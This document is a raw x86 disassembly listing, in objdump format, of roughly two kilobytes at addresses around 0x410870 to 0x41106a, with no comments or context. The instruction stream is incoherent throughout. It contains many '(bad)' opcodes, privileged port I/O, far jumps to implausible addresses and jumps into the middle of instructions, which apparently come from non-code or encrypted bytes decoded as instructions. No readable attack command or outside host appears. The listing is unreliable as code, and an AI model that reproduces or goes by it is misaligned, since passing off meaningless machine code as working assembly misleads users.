  41086c:	repz shl DWORD PTR [esi+0x1bf8103e],1
  410873:	sbb    DWORD PTR [edx],0xffffffc7
  410876:	adc    esp,DWORD PTR [ebx-0x4]
  410879:	jp     0x410830
  41087b:	push   cs
  41087c:	xor    ch,ch
  41087e:	fnstsw WORD PTR [edi+0x52]
  410881:	dec    edi
  410882:	dec    ecx
  410883:	pop    ebx
  410884:	fild   WORD PTR [edi]
  410886:	cmc    
  410887:	out    0xd7,eax
  410889:	push   ss
  41088a:	xchg   ebx,eax
  41088b:	retf   
  41088c:	mov    dl,0xc
  41088e:	int    0xe
  410890:	adc    BYTE PTR ds:0x19c619d9,dl
  410896:	mov    ebx,0x3a6533a
  41089b:	test   DWORD PTR [ecx],ecx
  41089d:	jecxz  0x410833
  41089f:	call   0x875e:0x5af27245
  4108a6:	mov    eax,0xe55b011f
  4108ab:	or     eax,DWORD PTR [eax+0x14]
  4108ae:	pop    ss
  4108af:	and    al,0x2d
  4108b1:	mov    fs,WORD PTR [ebx-0x2c]
  4108b4:	in     eax,0x4b
  4108b6:	call   0xb1ff6410
  4108bb:	loop   0x4108ab
  4108bd:	popa   
  4108be:	mov    bl,0x61
  4108c0:	jbe    0x410845
  4108c2:	sbb    dh,ch
  4108c4:	mov    dl,0x1e
  4108c6:	push   esp
  4108c7:	xchg   esp,eax
  4108c8:	adc    al,0x9d
  4108ca:	nop
  4108cb:	ins    BYTE PTR es:[edi],dx
  4108cc:	cmp    esp,DWORD PTR [eax+esi*4]
  4108cf:	pop    ds
  4108d0:	std    
  4108d1:	xchg   esp,eax
  4108d2:	lods   al,BYTE PTR ds:[esi]
  4108d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108d4:	mov    edx,DWORD PTR ds:0x55bdd662
  4108da:	out    dx,eax
  4108db:	mov    edx,0xa5d3f482
  4108e0:	cmp    al,0xd
  4108e2:	push   es
  4108e3:	jne    0x410925
  4108e5:	test   al,0xfd
  4108e7:	inc    esp
  4108e8:	xchg   ecx,eax
  4108e9:	push   esp
  4108ea:	jo     0x41092c
  4108ec:	jmp    DWORD PTR [ebx+0x64]
  4108ef:	mov    al,ds:0xc5000131
  4108f4:	out    0x1f,al
  4108f6:	xor    eax,0x7d06b803
  4108fb:	cmp    bh,bl
  4108fd:	sti    
  4108fe:	das    
  4108ff:	inc    eax
  410900:	popa   
  410901:	xor    DWORD PTR [esi-0x2c7b163e],ebx
  410907:	adc    eax,0xe8c038b1
  41090c:	int3   
  41090d:	popf   
  41090e:	out    dx,al
  41090f:	jo     0x41098f
  410911:	je     0x4108c7
  410913:	outs   dx,DWORD PTR ds:[esi]
  410914:	and    BYTE PTR [ebx+eax*4+0x52383bb9],0xf7
  41091c:	popf   
  41091d:	jl     0x4108d3
  41091f:	icebp  
  410920:	xor    al,0x61
  410922:	or     DWORD PTR ds:0x8ec20ef,ebp
  410928:	mov    ah,0xf8
  41092a:	hlt    
  41092b:	inc    ebp
  41092c:	clc    
  41092d:	mov    ds:0xc332bc6c,eax
  410932:	cld    
  410933:	push   ebp
  410934:	mov    dh,0xb0
  410936:	push   ebp
  410937:	adc    bl,BYTE PTR [ebx-0x2d024319]
  41093d:	and    ebp,DWORD PTR [ebp-0x96ae3a7]
  410943:	stos   BYTE PTR es:[edi],al
  410944:	xchg   edx,eax
  410945:	xchg   edx,eax
  410946:	imul   ebp,ebx,0xc4ed36a5
  41094c:	push   0x71
  41094e:	sahf   
  41094f:	int    0x86
  410951:	inc    ebx
  410952:	add    ebx,esi
  410954:	xchg   esi,eax
  410955:	mov    DWORD PTR [edx],ebx
  410957:	push   ebx
  410958:	in     eax,dx
  410959:	imul   eax,DWORD PTR [ebp+0x32129771],0xffffffa0
  410960:	fnstsw WORD PTR [edx-0x705231fd]
  410966:	loopne 0x4109ad
  410968:	xchg   eax,ebp
  41096a:	push   es
  41096b:	repnz ds ins BYTE PTR es:[edi],dx
  41096e:	add    DWORD PTR [ecx],ecx
  410970:	xchg   edi,eax
  410971:	cli    
  410972:	sub    al,0x4b
  410974:	out    0x1,eax
  410976:	pushf  
  410977:	loopne 0x4109cb
  410979:	jae    0x4109a8
  41097b:	scas   al,BYTE PTR es:[edi]
  41097c:	pop    eax
  41097d:	dec    ecx
  41097e:	sbb    ebp,ebx
  410980:	shl    BYTE PTR [eax+eax*4],cl
  410983:	adc    BYTE PTR [ecx],ah
  410985:	sub    DWORD PTR [esi+eiz*1-0x7eaa656f],ecx
  41098c:	or     BYTE PTR [edx-0x5dcc7659],bh
  410992:	(bad)  
  410993:	out    dx,eax
  410994:	jecxz  0x4109c3
  410996:	or     al,0xa3
  410998:	into   
  410999:	pop    ecx
  41099a:	popa   
  41099b:	mov    ds:0x16c1a7d6,eax
  4109a0:	mov    al,0x2a
  4109a2:	xchg   ecx,eax
  4109a3:	mov    bh,BYTE PTR [edx]
  4109a5:	push   ebp
  4109a6:	add    DWORD PTR [ebp+0x47e893da],edx
  4109ac:	icebp  
  4109ad:	les    eax,FWORD PTR [edi]
  4109af:	sbb    al,ah
  4109b1:	fdivr  DWORD PTR [ebx-0x1c]
  4109b4:	ins    BYTE PTR es:[edi],dx
  4109b5:	call   FWORD PTR [edi+0x6c7ed162]
  4109bb:	pop    eax
  4109bc:	xor    BYTE PTR [ebx+0x35],0xaa
  4109c0:	xchg   DWORD PTR [eax+ecx*1+0x1b37a45d],ecx
  4109c7:	pusha  
  4109c8:	xchg   ecx,eax
  4109c9:	cmp    ecx,DWORD PTR [eax-0x5441db8d]
  4109cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4109d0:	(bad)  
  4109d1:	mov    dh,0x9d
  4109d3:	mov    dh,0x7e
  4109d5:	daa    
  4109d6:	pop    ecx
  4109d7:	in     eax,0x3c
  4109d9:	jo     0x4109cf
  4109db:	jmp    0x41097b
  4109dd:	(bad)  
  4109de:	ror    edi,cl
  4109e0:	cld    
  4109e1:	in     al,dx
  4109e2:	jo     0x4109bd
  4109e4:	jb     0x410a0a
  4109e6:	mov    al,0x6e
  4109e8:	mov    bl,0xa0
  4109ea:	iret   
  4109eb:	loopne 0x4109b6
  4109ed:	setbe  BYTE PTR [edi+edi*2+0x21]
  4109f2:	dec    esi
  4109f3:	adc    bh,dl
  4109f5:	or     esi,edx
  4109f7:	or     DWORD PTR [eax],ecx
  4109f9:	cs fs sbb eax,0x873db628
  410a00:	call   0x5a1cbad4
  410a05:	jmp    0x4d462491
  410a0a:	jmp    0x410a45
  410a0c:	xchg   DWORD PTR [ecx],esp
  410a0e:	(bad)  
  410a0f:	mov    ebx,0x270e962b
  410a14:	dec    esi
  410a15:	cmp    bl,bl
  410a17:	inc    edx
  410a18:	sub    BYTE PTR [esi+0x61],dh
  410a1b:	aad    0x43
  410a1d:	test   BYTE PTR [ecx-0x29],bl
  410a20:	in     al,dx
  410a21:	push   cs
  410a22:	nop
  410a23:	fneni(8087 only) 
  410a25:	xor    eax,0x4b8463c1
  410a2a:	in     al,0x28
  410a2c:	mov    bl,0x37
  410a2e:	dec    ebp
  410a2f:	mov    ?,WORD PTR [edi]
  410a31:	leave  
  410a32:	fdiv   DWORD PTR [eax+0x4f]
  410a35:	int3   
  410a36:	jmp    0xb6fe1b73
  410a3b:	(bad)  
  410a3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a3e:	sub    DWORD PTR [edx],ecx
  410a40:	test   eax,0x157ee59c
  410a45:	pop    edx
  410a46:	push   ebx
  410a47:	ret    0x79e6
  410a4a:	or     DWORD PTR [esi],edx
  410a4c:	add    ch,BYTE PTR [edi+0x5cd47936]
  410a52:	inc    edi
  410a53:	fldl2e 
  410a55:	out    0xa3,eax
  410a57:	icebp  
  410a58:	sub    al,0x53
  410a5a:	mov    esi,esp
  410a5c:	idiv   BYTE PTR [ebx+0x7f]
  410a5f:	ficomp WORD PTR [edi+0x2808341b]
  410a65:	or     al,0xe4
  410a67:	cwde   
  410a68:	push   eax
  410a69:	int    0xc0
  410a6b:	add    ebp,esi
  410a6d:	in     al,dx
  410a6e:	retf   
  410a6f:	enter  0x57ef,0x60
  410a73:	inc    eax
  410a74:	dec    edx
  410a75:	jecxz  0x410ad0
  410a77:	mov    ebp,0x74c17e44
  410a7c:	dec    ebx
  410a7d:	mov    ebp,0x1830b5a8
  410a82:	call   0x97e8d9fa
  410a87:	cdq    
  410a88:	outs   dx,DWORD PTR ds:[esi]
  410a89:	hlt    
  410a8a:	pop    ebp
  410a8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a8c:	aam    0xee
  410a8e:	fs mov esp,?
  410a91:	push   ds
  410a92:	cmp    ch,0xd8
  410a95:	arpl   sp,dx
  410a97:	cwde   
  410a98:	aas    
  410a99:	dec    eax
  410a9a:	add    eax,ebp
  410a9c:	arpl   WORD PTR [eax-0x53f49783],bx
  410aa2:	cmc    
  410aa3:	mov    DWORD PTR [edi],esp
  410aa5:	fidivr DWORD PTR [ecx+0x636e02f3]
  410aab:	mov    edi,0x554cea73
  410ab0:	inc    edx
  410ab1:	(bad)  
  410ab2:	xrelease xchg BYTE PTR [ebp-0x39ff90e0],dl
  410ab9:	fcomp  st(5)
  410abb:	enter  0xf9d5,0x18
  410abf:	iret   
  410ac0:	cmp    eax,0xf9b525ad
  410ac5:	fst    QWORD PTR [edx]
  410ac7:	and    ebx,edi
  410ac9:	xchg   edx,eax
  410aca:	jg     0x410ad2
  410acc:	call   0x605776ef
  410ad1:	repz rcl edx,1
  410ad4:	cli    
  410ad5:	xchg   edi,eax
  410ad6:	cmp    ch,BYTE PTR [esi-0x25]
  410ad9:	push   0x14e63473
  410ade:	mov    ds:0xe3d83246,eax
  410ae3:	idiv   DWORD PTR [esi+0x39a343a8]
  410ae9:	push   ss
  410aea:	push   es
  410aeb:	or     DWORD PTR [ebx],ebx
  410aed:	addps  xmm3,xmm3
  410af0:	and    BYTE PTR [ebp+0x3eb72b17],0xbd
  410af7:	fcom   QWORD PTR [ebp+ebx*1+0x79]
  410afb:	pop    esi
  410afc:	xchg   ecx,eax
  410afd:	mov    ecx,DWORD PTR [esi-0x3a7393fc]
  410b03:	popa   
  410b04:	addr16 popf 
  410b06:	mov    edx,0x5d02c559
  410b0b:	adc    eax,0xb1b82a82
  410b10:	popa   
  410b11:	test   eax,0x2b245fe0
  410b16:	(bad)  
  410b17:	sbb    al,0x24
  410b19:	lock mov bl,0xb2
  410b1c:	je     0x410ae7
  410b1e:	pop    ss
  410b1f:	jmp    0xde7b51f1
  410b24:	in     al,dx
  410b25:	push   ds
  410b26:	push   0xa9540fa4
  410b2b:	mul    BYTE PTR [ebx+0x14]
  410b2e:	cld    
  410b2f:	hlt    
  410b30:	(bad)  
  410b31:	fisub  DWORD PTR [edi+0x754a1393]
  410b37:	mov    DWORD PTR [eax+ecx*4],0xc833a076
  410b3e:	push   0x28d66e93
  410b43:	lea    eax,[edx-0x78]
  410b46:	or     eax,0x4a46c116
  410b4b:	pop    ds
  410b4c:	jae    0x410ad5
  410b4e:	clc    
  410b4f:	pop    ebx
  410b50:	sbb    BYTE PTR ds:0x1a3d3a0,ah
  410b56:	fs fdivr st(0),st
  410b59:	cmc    
  410b5a:	jmp    0x35d32ddd
  410b5f:	pop    edi
  410b60:	shl    BYTE PTR [edi+0x31a24d23],1
  410b66:	lds    esi,FWORD PTR [ecx-0x53d08a1b]
  410b6c:	jmp    0x410b64
  410b6e:	add    al,dh
  410b70:	and    ah,cl
  410b72:	jae    0x410bb1
  410b74:	(bad)  
  410b76:	ret    0x4c32
  410b79:	jecxz  0x410bb5
  410b7b:	xor    ah,cl
  410b7d:	repnz mov ebx,DWORD PTR [ecx+0x60]
  410b81:	adc    eax,0x2a9df7d3
  410b86:	test   DWORD PTR [esi+0x67],0xae9ceea5
  410b8d:	cmp    edi,edx
  410b8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b90:	js     0x410b5e
  410b92:	(bad)  
  410b93:	fadd   DWORD PTR [edx]
  410b95:	mov    BYTE PTR [ebp+0x4a],al
  410b98:	fistp  QWORD PTR [edx+0x40]
  410b9b:	icebp  
  410b9c:	pop    ss
  410b9d:	push   edx
  410b9e:	scas   eax,DWORD PTR es:[edi]
  410b9f:	inc    edi
  410ba0:	in     al,0x1c
  410ba2:	dec    ebp
  410ba3:	cmp    al,0x92
  410ba5:	jmp    0xb597:0x5405228e
  410bac:	dec    esi
  410bad:	(bad)  
  410bae:	sbb    al,0xdd
  410bb0:	xor    DWORD PTR [esi+0x52],0xffffff80
  410bb4:	fiadd  WORD PTR [ebp+0x5e]
  410bb7:	out    0x71,al
  410bb9:	pop    edx
  410bba:	push   0x13
  410bbc:	mov    eax,0xcf5c672b
  410bc1:	xchg   DWORD PTR [edx-0x64],eax
  410bc4:	jo     0x410c26
  410bc6:	in     eax,dx
  410bc7:	and    al,0xa7
  410bc9:	or     ch,BYTE PTR [ebp+0x4e]
  410bcc:	mov    esp,0x1f50ac33
  410bd1:	retf   
  410bd2:	stos   DWORD PTR es:[edi],eax
  410bd3:	jle    0x410be6
  410bd5:	leave  
  410bd6:	rcr    esi,0xcc
  410bd9:	jecxz  0x410c0c
  410bdb:	popa   
  410bdc:	mov    ecx,0x9d6a1170
  410be1:	int3   
  410be2:	fist   WORD PTR ds:0x2fb519be
  410be8:	test   DWORD PTR [ecx],esi
  410bea:	jle    0x410c0a
  410bec:	mov    ds:0x5161ff96,al
  410bf1:	adc    ah,ch
  410bf3:	lods   al,BYTE PTR ds:[esi]
  410bf4:	xchg   esi,eax
  410bf5:	add    dh,BYTE PTR [esi-0xd8ed4f1]
  410bfb:	pop    eax
  410bfc:	push   eax
  410bfd:	xor    BYTE PTR [esi],bh
  410bff:	push   ecx
  410c00:	mov    esp,0xa215730a
  410c05:	test   BYTE PTR [edx+0x10],bh
  410c08:	pop    ss
  410c09:	xlat   BYTE PTR ds:[ebx]
  410c0a:	call   0xc5d8f5e0
  410c0f:	mov    fs,WORD PTR [ebx+0x4b136761]
  410c15:	mov    ebx,0x368a1b4b
  410c1a:	mov    ah,bh
  410c1c:	std    
  410c1d:	xor    al,0xef
  410c1f:	mov    ebx,cs
  410c21:	stc    
  410c22:	push   edi
  410c23:	pop    esp
  410c24:	ret    
  410c25:	jmp    0x410baf
  410c27:	mov    edx,0x3a76be78
  410c2c:	lea    edi,[eax-0x10c4a88]
  410c32:	sub    eax,0xdc4a3b00
  410c37:	(bad)  
  410c38:	push   0x762562a6
  410c3d:	add    edi,eax
  410c3f:	lods   al,BYTE PTR ds:[esi]
  410c40:	sti    
  410c41:	push   esp
  410c42:	pop    edx
  410c43:	lahf   
  410c44:	jbe    0x410c02
  410c46:	jle    0x410c22
  410c48:	push   ebx
  410c49:	shl    DWORD PTR [ebp-0x3c],0xf0
  410c4d:	xor    DWORD PTR [edi],esi
  410c4f:	sub    BYTE PTR [ebp-0x5a],0x64
  410c53:	test   ch,dh
  410c55:	xor    bl,ah
  410c57:	int3   
  410c58:	mov    ecx,0x193d5d22
  410c5d:	(bad)  
  410c5e:	jmp    0xd9b1:0xb9007e70
  410c65:	fst    QWORD PTR ds:0xc895919b
  410c6b:	mov    cl,0xcf
  410c6d:	pop    eax
  410c6e:	dec    ecx
  410c6f:	(bad)  
  410c70:	mov    edx,0xa9a1c0b4
  410c75:	xor    eax,0x7195e3fc
  410c7a:	pop    ds
  410c7b:	adc    eax,0xc1e327c
  410c80:	jns    0x259c72df
  410c86:	pop    es
  410c87:	add    DWORD PTR [ebx],ecx
  410c89:	call   DWORD PTR [edx+0x59d0170c]
  410c8f:	adc    al,0xc8
  410c91:	aaa    
  410c92:	cwde   
  410c93:	adc    ch,BYTE PTR [edx]
  410c95:	add    cl,BYTE PTR [eax]
  410c97:	loope  0x410c3a
  410c99:	adc    cl,BYTE PTR [ebp-0x1c]
  410c9c:	sar    BYTE PTR [eax+0x1027eaec],1
  410ca2:	loopne 0x410cd1
  410ca4:	lea    esi,[edx]
  410ca6:	and    esp,esp
  410ca8:	mov    esp,0x6b2a1e41
  410cad:	and    eax,edi
  410caf:	aas    
  410cb0:	std    
  410cb1:	pusha  
  410cb2:	js     0x410c8b
  410cb4:	jmp    0x217be69f
  410cb9:	loop   0x410ce2
  410cbb:	xchg   DWORD PTR [esi],esp
  410cbd:	in     eax,0x94
  410cbf:	int3   
  410cc0:	(bad)  
  410cc1:	push   ecx
  410cc2:	popf   
  410cc3:	jmp    0x410cff
  410cc5:	mov    esp,0x45d062b2
  410cca:	push   edx
  410ccb:	loope  0x410cf8
  410ccd:	sbb    ch,BYTE PTR [esp+ecx*1-0x13925d21]
  410cd4:	sbb    ah,BYTE PTR [edx+esi*2+0x50e2d64c]
  410cdb:	cmp    DWORD PTR [ecx],ecx
  410cdd:	std    
  410cde:	or     bl,BYTE PTR [ecx+0xa]
  410ce1:	in     eax,dx
  410ce2:	or     bh,BYTE PTR [ecx-0x75]
  410ce5:	jp     0x410cf5
  410ce7:	jecxz  0x410c8d
  410ce9:	adc    BYTE PTR [eax],al
  410ceb:	call   0x6420:0x25e7985
  410cf2:	jmp    0x2e62:0xa80b85ab
  410cf9:	jp     0x410c8b
  410cfb:	xor    BYTE PTR [ebx+0x7f],cl
  410cfe:	gs loope 0x410ceb
  410d01:	cmp    BYTE PTR [edx+0xa],dl
  410d04:	push   ebp
  410d05:	arpl   WORD PTR [eax-0x221f960d],cx
  410d0b:	jg     0x410cb4
  410d0d:	ins    BYTE PTR es:[edi],dx
  410d0e:	cs xchg ebp,eax
  410d10:	sbb    DWORD PTR [esp+edx*2],esi
  410d13:	cld    
  410d14:	add    BYTE PTR [ebp+eiz*4-0x33],dl
  410d18:	stc    
  410d19:	or     eax,0xa6ed63d6
  410d1e:	or     al,0x12
  410d20:	push   edx
  410d21:	mov    WORD PTR [eax-0x72b815b4],ss
  410d27:	jle    0x410d15
  410d29:	jns    0x410d24
  410d2b:	push   edx
  410d2c:	frstor [esi+0x3eb784ca]
  410d32:	dec    ebx
  410d33:	xor    eax,0x48ca2a19
  410d38:	je     0x410d9e
  410d3a:	cwde   
  410d3b:	cmp    BYTE PTR [ebx-0x27],ah
  410d3e:	dec    ebx
  410d3f:	jne    0x410d53
  410d41:	mov    dh,0xcf
  410d43:	aaa    
  410d44:	add    eax,0x7c5ecef2
  410d49:	and    ebp,edi
  410d4b:	pop    es
  410d4c:	mov    ebp,0x7f4073de
  410d51:	dec    esi
  410d52:	es es scas al,BYTE PTR es:[edi]
  410d55:	mov    dh,0x47
  410d57:	dec    ecx
  410d58:	mov    edx,0x2b42fd82
  410d5d:	(bad)  
  410d5e:	adc    esi,DWORD PTR [edi]
  410d60:	loop   0x410d44
  410d62:	and    BYTE PTR [ebp-0x7f92f083],ah
  410d68:	or     al,0x92
  410d6a:	and    BYTE PTR [eax+0xc],dh
  410d6d:	gs or  ch,ch
  410d70:	jmp    0xf960356a
  410d75:	xchg   ebp,eax
  410d76:	daa    
  410d77:	and    edi,esp
  410d79:	pusha  
  410d7a:	ja     0x410d09
  410d7c:	xchg   esp,eax
  410d7d:	test   al,0x74
  410d7f:	(bad)  
  410d80:	icebp  
  410d81:	ins    DWORD PTR es:[edi],dx
  410d82:	pop    ebp
  410d83:	xchg   ebp,eax
  410d84:	(bad)  
  410d85:	pop    ss
  410d86:	mov    eax,0x3311d110
  410d8b:	sub    edx,0x5a
  410d8e:	jmp    0x7090:0x7b1d2417
  410d95:	cmp    esp,ebp
  410d97:	lds    eax,FWORD PTR [ecx+ebx*4]
  410d9a:	nop
  410d9b:	and    al,0x97
  410d9d:	add    BYTE PTR [edx-0x59ea73c2],0xca
  410da4:	sub    al,0xcc
  410da6:	sbb    DWORD PTR [edx],edx
  410da8:	rcl    BYTE PTR [edx+0x1f00ff78],cl
  410dae:	(bad)  
  410daf:	jl     0x410d79
  410db1:	(bad)  
  410db2:	xchg   ebx,eax
  410db3:	leave  
  410db4:	(bad)  
  410db5:	mov    ebp,0xc1158e33
  410dba:	or     al,0x65
  410dbc:	dec    edi
  410dbd:	jmp    0x9d87:0xfa6db7d9
  410dc4:	out    dx,eax
  410dc5:	mov    bh,0xd0
  410dc7:	pushf  
  410dc8:	mov    ebx,0xe2bcb0e2
  410dcd:	outs   dx,DWORD PTR ds:[esi]
  410dce:	inc    eax
  410dcf:	jne    0x410e41
  410dd1:	mov    ch,0xfe
  410dd3:	in     al,dx
  410dd4:	leave  
  410dd5:	test   eax,0x6e2cb3e6
  410dda:	ret    
  410ddb:	sar    ecx,1
  410ddd:	int3   
  410dde:	mov    esp,0x20653993
  410de3:	fmul   DWORD PTR [edi-0x9]
  410de6:	sti    
  410de7:	or     eax,0xe7b3b384
  410dec:	inc    esp
  410ded:	adc    BYTE PTR [edx+esi*4-0x7d],0x4e
  410df2:	stc    
  410df3:	pop    ss
  410df4:	add    esp,DWORD PTR [edi+esi*4]
  410df7:	push   es
  410df8:	jae    0x410da5
  410dfa:	fs dec esi
  410dfc:	iret   
  410dfd:	sub    eax,0x4fa068f9
  410e02:	cli    
  410e03:	not    BYTE PTR [edx+0x2]
  410e06:	mov    edi,0x6a04ff10
  410e0b:	or     esi,DWORD PTR [esi]
  410e0d:	bound  ecx,QWORD PTR [edx-0x3b]
  410e10:	cmp    ebx,ebx
  410e12:	cdq    
  410e13:	out    dx,eax
  410e14:	push   es
  410e15:	ds daa 
  410e17:	out    dx,eax
  410e18:	pop    esi
  410e19:	cwde   
  410e1a:	ins    DWORD PTR es:[edi],dx
  410e1b:	imul   edx,DWORD PTR [edx+ebx*1-0x54384d22],0x827c93d9
  410e26:	sbb    BYTE PTR ds:0xe2868f1e,bh
  410e2c:	in     al,0x30
  410e2e:	xchg   ebp,eax
  410e2f:	data16 in al,dx
  410e31:	sub    ecx,0xffffffdd
  410e34:	jne    0x410e2d
  410e36:	inc    esi
  410e37:	push   ds
  410e38:	rcr    ah,cl
  410e3a:	push   cs
  410e3b:	xor    dl,BYTE PTR [ebx+0x61826746]
  410e41:	mov    edi,0x8702dbac
  410e46:	lods   eax,DWORD PTR ds:[esi]
  410e47:	in     al,dx
  410e48:	icebp  
  410e49:	lahf   
  410e4a:	mov    ecx,0xecb02be8
  410e4f:	add    DWORD PTR [eax+0x7db999b7],ebp
  410e55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e56:	mov    ecx,0xd9d5577d
  410e5b:	pop    DWORD PTR [edx-0x7e4063d]
  410e61:	repz pop ecx
  410e63:	rcl    BYTE PTR [ebx-0x14],0x5c
  410e67:	adc    eax,0x3ac6d4ff
  410e6c:	fistp  WORD PTR [ecx+0x6e73efc0]
  410e72:	sbb    eax,0x248f5268
  410e77:	lahf   
  410e78:	rol    ebp,0xd5
  410e7b:	pusha  
  410e7c:	cmc    
  410e7d:	and    DWORD PTR [ebx-0x46],ebx
  410e80:	or     bl,BYTE PTR [ebp+0x7d939154]
  410e86:	cmp    ebx,DWORD PTR [ebx+ebx*4-0x26c0c2cd]
  410e8d:	les    ecx,FWORD PTR [edi+0x6]
  410e90:	jg     0x410e1b
  410e92:	ss scas al,BYTE PTR es:[edi]
  410e94:	jp     0x410e21
  410e96:	std    
  410e97:	les    ebx,FWORD PTR [edx*4-0x284d84aa]
  410e9e:	ficom  DWORD PTR [ecx+0x5aa054a3]
  410ea4:	out    0x19,al
  410ea6:	(bad)  
  410ea7:	sub    BYTE PTR ds:0x43023c11,al
  410ead:	push   ebp
  410eae:	data16 jo 0x410f16
  410eb1:	imul   esi,DWORD PTR [esi],0x2a3ccd0d
  410eb7:	jmp    0xc1a2ab61
  410ebc:	mov    ch,0x9b
  410ebe:	jno    0x410ea3
  410ec0:	and    edi,edi
  410ec2:	sub    bh,BYTE PTR [edi-0x22102390]
  410ec8:	mov    edi,0x7898090a
  410ecd:	repz gs cld 
  410ed0:	enter  0x4c34,0x5d
  410ed4:	int    0x35
  410ed6:	xor    eax,0x5a8e8980
  410edb:	cs pop es
  410edd:	xor    edx,DWORD PTR [esi-0x460ea559]
  410ee3:	bnd ja 0x410eb9
  410ee6:	and    BYTE PTR [ecx+0x65],dl
  410ee9:	inc    ebp
  410eea:	mov    ds,ebx
  410eec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410eed:	mov    bl,ah
  410eef:	mov    esi,fs
  410ef1:	dec    ecx
  410ef2:	xchg   edi,eax
  410ef3:	sbb    DWORD PTR [ecx],ebp
  410ef5:	inc    esp
  410ef6:	fsubr  st,st(5)
  410ef8:	add    eax,0x29ef2d43
  410efd:	add    DWORD PTR [ebx-0x2fd6e],esp
  410f03:	mov    bh,0x5b
  410f05:	shr    DWORD PTR [edi+0x25a26d37],cl
  410f0b:	sbb    al,0x1e
  410f0d:	and    al,0xea
  410f0f:	int3   
  410f10:	jecxz  0x410ef7
  410f12:	or     eax,0xffebc5e
  410f17:	or     eax,0xf11c35ed
  410f1c:	popf   
  410f1d:	scas   al,BYTE PTR es:[edi]
  410f1e:	push   es
  410f1f:	or     edx,DWORD PTR [edi+ecx*8-0x398f0569]
  410f26:	jmp    0xb322b0e9
  410f2b:	dec    edi
  410f2c:	adc    dl,BYTE PTR [ecx+ebx*8-0x62]
  410f30:	or     DWORD PTR [edi-0x6e],esp
  410f33:	bound  esp,QWORD PTR [ebp-0x5b]
  410f36:	mov    dl,0xab
  410f38:	je     0x410f31
  410f3a:	jnp    0x410ec7
  410f3c:	push   0x71
  410f3e:	inc    esi
  410f3f:	retf   0xbb1e
  410f42:	mov    DWORD PTR [eax],edi
  410f44:	jbe    0x410ef4
  410f46:	bound  esi,QWORD PTR [eax+0x7b]
  410f49:	sub    DWORD PTR [esi-0x39],ecx
  410f4c:	call   0xad3d:0x6e302f97
  410f53:	and    ah,BYTE PTR [edi]
  410f55:	in     al,0xbe
  410f57:	adc    al,0xd3
  410f59:	sbb    BYTE PTR [edi+0x33aae6c5],cl
  410f5f:	dec    edx
  410f60:	dec    esp
  410f61:	cmc    
  410f62:	jecxz  0x410fc6
  410f64:	pop    edi
  410f65:	cwde   
  410f66:	xor    BYTE PTR [ecx],cl
  410f68:	fs push esi
  410f6a:	test   al,0x37
  410f6c:	data16 add al,0x2c
  410f6f:	ret    
  410f70:	xchg   ebx,eax
  410f71:	sub    eax,0xfb7cecab
  410f76:	data16 jne 0x410f07
  410f79:	mov    WORD PTR [esi-0x79],?
  410f7c:	scas   al,BYTE PTR es:[edi]
  410f7d:	and    eax,0x2adefcd
  410f82:	aaa    
  410f83:	sub    eax,0xc2d170f0
  410f88:	test   BYTE PTR ds:0xbe320c78,bh
  410f8e:	add    al,0xbd
  410f90:	dec    edx
  410f91:	or     DWORD PTR [ebp+0x26],0x110b994d
  410f98:	xor    BYTE PTR [edi+0x4241d0e4],dh
  410f9e:	sub    esi,ebp
  410fa0:	push   es
  410fa1:	pop    edi
  410fa2:	push   ebp
  410fa3:	jae    0x410fbf
  410fa5:	dec    ebx
  410fa6:	push   eax
  410fa7:	adc    DWORD PTR [esi+0x4c],ebp
  410faa:	imul   ebp,edx,0xaecbf91a
  410fb0:	gs clc 
  410fb2:	lods   al,BYTE PTR ds:[esi]
  410fb3:	stos   DWORD PTR es:[edi],eax
  410fb4:	xchg   ebp,eax
  410fb5:	mov    cl,bl
  410fb7:	push   0x635e008b
  410fbc:	rcl    BYTE PTR [ebx+0x26],cl
  410fbf:	xchg   edx,eax
  410fc0:	or     al,BYTE PTR [ebx+0x4b7e4673]
  410fc6:	add    BYTE PTR [eax],al
  410fc8:	sbb    cl,BYTE PTR [esi-0x53dc6944]
  410fce:	jb     0x410f5e
  410fd0:	push   ss
  410fd1:	dec    eax
  410fd2:	dec    ebx
  410fd3:	add    al,BYTE PTR [ebx+edx*8]
  410fd6:	fisubr WORD PTR [edi+ebp*2+0x2a3e36db]
  410fdd:	ficom  WORD PTR [esi-0x4]
  410fe0:	xchg   ebp,esi
  410fe2:	mov    al,ds:0xd509c20b
  410fe7:	dec    edx
  410fe8:	jo     0x410f91
  410fea:	mov    bl,0xe8
  410fec:	or     ebp,edx
  410fee:	(bad)  
  410fef:	out    dx,eax
  410ff0:	inc    ebp
  410ff1:	or     eax,0x7da7c8af
  410ff6:	pop    edx
  410ff7:	shl    BYTE PTR [ecx-0x14],0xa7
  410ffb:	dec    ecx
  410ffc:	mov    ds:0xb8ebcf21,al
  411001:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411002:	sbb    edi,ecx
  411004:	fadd   QWORD PTR [ebp+0x2d]
  411007:	adc    cl,BYTE PTR [ebp-0x6110beb3]
  41100d:	retf   0x94d5
  411010:	pop    ecx
  411011:	inc    ebx
  411012:	adc    ah,dh
  411014:	idiv   DWORD PTR [esi]
  411016:	ret    
  411017:	cmp    al,cl
  411019:	and    cl,BYTE PTR [edi+esi*1+0x75e8866a]
  411020:	adc    dh,0xad
  411023:	jnp    0x41109d
  411025:	dec    edx
  411026:	out    0xa4,al
  411028:	mov    ecx,eax
  41102a:	pop    ds
  41102b:	fst    QWORD PTR [edx]
  41102d:	xchg   esp,eax
  41102e:	mov    ecx,0x74df19f6
  411033:	mov    esi,0xda62a33d
  411038:	sub    eax,0xfed50da4
  41103d:	and    BYTE PTR [ecx+0x60eb0107],dl
  411043:	jo     0x411052
  411045:	aad    0xf7
  411047:	pop    esi
  411048:	sbb    eax,0x13680ba8
  41104d:	stos   DWORD PTR es:[edi],eax
  41104e:	xlat   BYTE PTR ds:[ebx]
  41104f:	adc    DWORD PTR [edx-0x14],edx
  411052:	rol    DWORD PTR [edx+ebp*1-0x3c],cl
  411056:	mov    edx,0xcfac5698
  41105b:	sub    eax,0x5b8453ac
  411060:	jmp    0xed8b:0xbbef4566
  411067:	retf   0x9d5e
  41106a:	xor    eax,0x97de81d3
